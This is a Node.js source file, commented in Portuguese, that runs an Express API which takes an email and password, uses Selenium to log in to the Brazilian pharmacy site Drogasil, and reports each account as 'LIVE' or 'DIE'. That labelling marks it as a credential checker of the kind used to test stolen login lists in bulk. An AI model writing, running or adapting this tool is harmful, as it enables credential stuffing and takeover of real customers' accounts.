import express from 'express';
import { Builder, By, until } from 'selenium-webdriver';
import chrome from 'selenium-webdriver/chrome.js';
import bodyParser from 'body-parser';
import picocolors from 'picocolors';

const app = express();
const port = 3000;

// Middleware para processar JSON
app.use(bodyParser.json());

// Endpoint para verificar login no site da Drogasil
app.post('/api/check-drogasil', async (req, res) => {
    const { email, password } = req.body;

    if (!email || !password) {
        return res.status(400).json({ error: 'Email e senha são obrigatórios' });
    }

    let options = new chrome.Options();
    options.addArguments('--log-level=3');
    options.addArguments('--disable-logging');
    options.addArguments('--disable-gpu');

    let driver = await new Builder().setChromeOptions(options).forBrowser('chrome').build();

    try {
        // Navegar até a página principal da Drogasil
        await driver.get('https://www.drogasil.com.br/');

        // Rejeitar cookies
        let cookiesReject = await driver.wait(until.elementLocated(By.id('onetrust-reject-all-handler')), 10000);
        await cookiesReject.click();

        // Ir para a página de login
        let loginPage = await driver.wait(until.elementLocated(By.className('user-menu-container user-menu-box')), 10000);
        await loginPage.click();

        let loginPage2 = await driver.findElement(By.css('[data-qa="header_menu_btn_login"]'));
        await loginPage2.click();

        // Inserir email e senha
        let inputEmail = await driver.wait(until.elementLocated(By.id('signInName')), 10000);
        let inputPassw = await driver.wait(until.elementLocated(By.id('password')), 10000);
        let btnLogin = await driver.wait(until.elementLocated(By.id('next')), 10000);

        // Rolar a página para baixo (se necessário)
        await driver.executeScript("window.scrollTo(0, document.body.scrollHeight);");

        await inputEmail.sendKeys(email);
        await inputPassw.sendKeys(password);

        // Clicar no botão de login
        await btnLogin.click();

        await driver.sleep(3000);

        // Verificar se o login foi bem-sucedido
        let textElement = await driver.wait(until.elementLocated(By.tagName('body')), 10000);
        let text = await textElement.getText();

        let url = await driver.getCurrentUrl();

        if (text.includes('E-mail, CPF ou senha inválida.')) {
            console.log(picocolors.red(`[ DIE ] » ${email} » [ E-mail, CPF ou senha inválida. ]`));
            return res.json({ status: 'DIE', message: `Login inválido para o email: ${email}` });
        } else if (url === 'https://www.drogasil.com.br/customer/account/loginSuccess') {
            console.log(picocolors.green(`[ LIVE ] » ${email} » [ Login válido ]`));
            return res.json({ status: 'LIVE', message: `Login bem-sucedido para o email: ${email}` });
        }

    } catch (error) {
        console.error(picocolors.red(`[ ERROR ] » ${email} » [ Erro ao tentar fazer login: ${error.message} ]`));
        return res.status(500).json({ error: `Erro ao tentar fazer login: ${error.message}` });
    } finally {
        await driver.quit();
    }
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`API da Drogasil rodando em http://localhost:${port}`);
});
